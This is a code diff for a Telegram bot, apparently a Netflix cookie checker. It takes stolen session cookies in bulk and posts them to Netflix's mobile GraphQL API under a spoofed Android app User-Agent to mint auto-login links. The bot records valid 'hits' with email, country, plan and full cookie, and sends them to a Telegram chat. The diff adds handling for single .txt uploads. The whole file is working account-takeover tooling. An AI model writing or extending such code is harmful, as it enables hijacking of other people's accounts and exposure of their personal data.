@@ -61,22 +61,10 @@ class NetflixBulkChecker:
             for name, value in cookies_dict.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
             
-            payload = {
-                "operationName": "CreateAutoLoginToken",
-                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-                "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
-            }
-            headers = {
-                'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            }
+            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
+            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
             
-            response = session.post(
-                'https://android13.prod.ftl.netflix.com/graphql',
-                headers=headers, json=payload, timeout=15
-            )
-            
+            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
             if response.status_code == 200:
                 data = response.json()
                 if data.get('data', {}).get('createAutoLoginToken'):
@@ -193,28 +181,38 @@ class NetflixBulkChecker:
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "📤 Send me **ZIP** file or paste **cookie** directly in chat.")
+    bot.reply_to(message, "📤 Send **ZIP** or **single .txt file** or paste cookie directly.")
 
 @bot.message_handler(content_types=['document'])
-def handle_zip(message):
-    if not message.document.file_name.lower().endswith('.zip'):
-        bot.reply_to(message, "❌ Please send .zip file")
+def handle_file(message):
+    file_name = message.document.file_name.lower()
+    
+    if file_name.endswith('.zip'):
+        bot.reply_to(message, "✅ ZIP received. Checking...")
+        mode = "zip"
+    elif file_name.endswith('.txt'):
+        bot.reply_to(message, "✅ .txt file received. Checking...")
+        mode = "txt"
+    else:
+        bot.reply_to(message, "❌ Only .zip or .txt files allowed.")
         return
-
-    bot.reply_to(message, "✅ ZIP received. Checking...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded = bot.download_file(file_info.file_path)
 
         with tempfile.TemporaryDirectory() as tmp:
-            zip_path = os.path.join(tmp, "input.zip")
-            with open(zip_path, "wb") as f: f.write(downloaded)
-
-            extract_dir = os.path.join(tmp, "cookies")
-            os.makedirs(extract_dir, exist_ok=True)
-            with zipfile.ZipFile(zip_path, 'r') as z:
-                z.extractall(extract_dir)
+            if mode == "zip":
+                zip_path = os.path.join(tmp, "input.zip")
+                with open(zip_path, "wb") as f: f.write(downloaded)
+                extract_dir = os.path.join(tmp, "cookies")
+                os.makedirs(extract_dir, exist_ok=True)
+                with zipfile.ZipFile(zip_path, 'r') as z:
+                    z.extractall(extract_dir)
+            else:  # single txt
+                extract_dir = tmp
+                txt_path = os.path.join(tmp, file_name)
+                with open(txt_path, "wb") as f: f.write(downloaded)
 
             checker = NetflixBulkChecker(threads=10)
             checker.chat_id = str(message.chat.id)
@@ -235,9 +233,9 @@ def handle_zip(message):
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
 
-# ====================== DIRECT COOKIE IN CHAT ======================
+# ====================== DIRECT COOKIE TEXT ======================
 @bot.message_handler(func=lambda m: True)
-def handle_direct_cookie(message):
+def handle_direct_text(message):
     text = message.text.strip()
     if not text or not ("NetflixId=" in text or "\t" in text):
         return
@@ -250,9 +248,8 @@ def handle_direct_cookie(message):
         result = checker.check_cookie(text, "direct_chat")
 
         if result and result.get('login_url'):
-            bot.reply_to(message, f"✅ **Direct Login Link Ready**\n\n{result['login_url']}")
+            bot.reply_to(message, f"✅ **Direct Login Link**\n\n{result['login_url']}")
             
-            # Save to hits folder
             os.makedirs('hits', exist_ok=True)
             fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
             with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
@@ -266,7 +263,7 @@ def handle_direct_cookie(message):
                 f.write(f"Login URL: {result['login_url']}\n\n")
                 f.write("--- FULL COOKIE ---\n")
                 f.write(result['cookie'])
-            
+
             checker.send_hit_to_telegram(result)
         else:
             bot.reply_to(message, "❌ Invalid or Dead Cookie")
